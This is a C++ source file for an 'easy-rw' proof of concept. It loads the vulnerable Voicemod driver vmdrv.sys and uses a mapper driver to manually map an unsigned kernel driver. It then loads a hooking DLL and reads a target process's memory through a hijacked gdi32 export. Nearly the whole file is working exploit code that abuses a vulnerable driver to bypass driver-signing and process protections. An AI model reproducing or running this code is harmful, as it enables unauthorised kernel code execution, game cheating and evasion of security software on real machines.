#include <windows.h>
#include <iostream>
#include <fstream>
#include <TlHelp32.h>
#include <Psapi.h>
#include <ntstatus.h>
#include <iomanip>
#include "driver_loader.h"

bool file_exist(const std::string& file_path)
{
	std::ifstream file(file_path);
	return file.good();
}

bool search_for_vmdrv()
{
	LPVOID drivers[1024];
	DWORD size;

	if (K32EnumDeviceDrivers(drivers, sizeof(drivers), &size) &&
		size < sizeof(drivers))
	{
		wchar_t driver_name[MAX_PATH];

		int drivers_count = size / sizeof(drivers[0]);

		for (int i = 0; i < drivers_count; i++)
		{
			if (K32GetDeviceDriverBaseNameW(drivers[i], driver_name, MAX_PATH))
			{
				if (!_wcsicmp(driver_name, L"vmdrv.sys"))
					return true;
			}
		}
	}
	return false;
}

bool get_process_image_base(HANDLE process, DWORD_PTR& image_base)
{
	HMODULE process_base;
	DWORD size_needed;
	if (EnumProcessModules(process, &process_base, sizeof(process_base), &size_needed))
	{
		image_base = (DWORD_PTR)process_base;
		return true;
	}
	return false;
}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		std::cout << "Usage: easy-rw.exe <process pid>" << std::endl;
		return 0;
	}

	DWORD process_pid = atoi(argv[1]);

	std::cout << "easy-rw PoC" << std::endl;

	// check for file existing
	if (!file_exist("mapped_driver.sys") ||
		!file_exist("mapper_driver.sys") ||
		!file_exist("vmdrv.sys") ||
		!file_exist("DLLVMhk.dll"))
	{
		std::cout << "Error: one of the needed components not found in the directory" << std::endl;
		return 0;
	}

	bool vmdrv_present = search_for_vmdrv();
	bool load_drivers = true;
	if (vmdrv_present)
	{
		std::cout << "Warning: vmdrv is already loaded. Do you want to load the other drivers?" << std::endl;
		std::cout << "Press Y and enter for yes, any other key and enter otherwise" << std::endl;
		std::cout << "If you already opened this PoC before and the loading of all the drivers was successfull, you can skip this" << std::endl;

		std::string answer;
		std::cin >> answer;

		if (answer != "Y" && answer != "y")
			load_drivers = false;
	}

	if (load_drivers)
	{
		NTSTATUS driver_load_status;

		// get current path
		wchar_t current_path[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, current_path);

		if (!vmdrv_present)
		{
			// load vmdrv.sys
			std::wstring vmdrv_path = std::wstring(L"\\??\\") + std::wstring(current_path) + L"\\vmdrv.sys";
			if (!load_driver(L"VOICEMOD_Driver", vmdrv_path.c_str(), driver_load_status))
			{
				std::cout << "Failed loading vmdrv.sys" << std::endl;
				return 0;
			}
		}

		std::cout << "vmdrv.sys successfully loaded" << std::endl;

		// copy the driver to manualmap in C:\\

		if (!CopyFileW(L"mapped_driver.sys", L"C:\\driver.sys", FALSE))
		{
			std::cout << "Failed moving mapped_driver.sys to C:\\" << std::endl;
			return 0;
		}

		std::cout << "successfully copied mapped_driver.sys onto C:\\" << std::endl;

		// load mapper_driver.sys
		std::wstring mapper_driver_path = std::wstring(L"\\??\\") + std::wstring(current_path) + L"\\mapper_driver.sys";
		driver_load_status = 0;
		if (load_driver(L"mapper_driver", mapper_driver_path.c_str(), driver_load_status) 
			|| driver_load_status != STATUS_FAILED_DRIVER_ENTRY)
		{
			std::cout << "Failed loading mapper driver." << std::endl;
			return 0;
		}

		std::cout << "mapper_driver.sys successfully loaded" << std::endl;

		DeleteFileW(L"C:\\driver.sys");
	}

	// load DLLVMHk.dll
	HMODULE DLLVMHk_handle = LoadLibraryW(L"DLLVMhk.dll");

	if (DLLVMHk_handle == NULL)
	{
		std::cout << "Failed loading DLLVMHk module" << std::endl;
		return 0;
	}

	std::cout << "DLLVMhk successfully loaded in the process" << std::endl;

	// open a HANDLE to the process
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_pid);
	if (process == NULL)
	{
		std::cout << "Failed opening a handle to the process (perhaps wrong PID?)" << std::endl;
		return 0;
	}

	// Initialize the process handle for DLLVMhkt
	typedef void(*initialize_process_pid_prototype)(HANDLE pid);
	initialize_process_pid_prototype initialize_process_pid_function = 
		(initialize_process_pid_prototype)GetProcAddress(LoadLibraryW(L"gdi32.dll"), "D3DKMTVailDisconnect");
	initialize_process_pid_function(process);

	// get process image base
	DWORD_PTR process_image_base;
	if (!get_process_image_base(process, process_image_base))
	{
		std::cout << "Failed in getting process image base" << std::endl;
		CloseHandle(process);
		return 0;
	}

	std::cout << "process image base: 0x" << std::hex << std::setfill('0') << std::setw(2) << std::uppercase << process_image_base << std::endl;

	// read the MZ bytes to check if everything is working fine
	BYTE MZ_bytes[2];
	SIZE_T read_bytes = 0;
	if (!ReadProcessMemory(process, (LPCVOID)process_image_base, MZ_bytes, sizeof(MZ_bytes), &read_bytes))
	{
		std::cout << "Failed to read process image base" << std::endl;
		CloseHandle(process);
		return 0;
	}

	std::cout << "Printing read bytes: " << std::hex << std::setfill('0') << std::setw(2) << (int)MZ_bytes[0] << " " << (int)MZ_bytes[1] << std::endl;

	std::cout << "Success!" << std::endl;

	// done
	CloseHandle(process);

	return 0;
}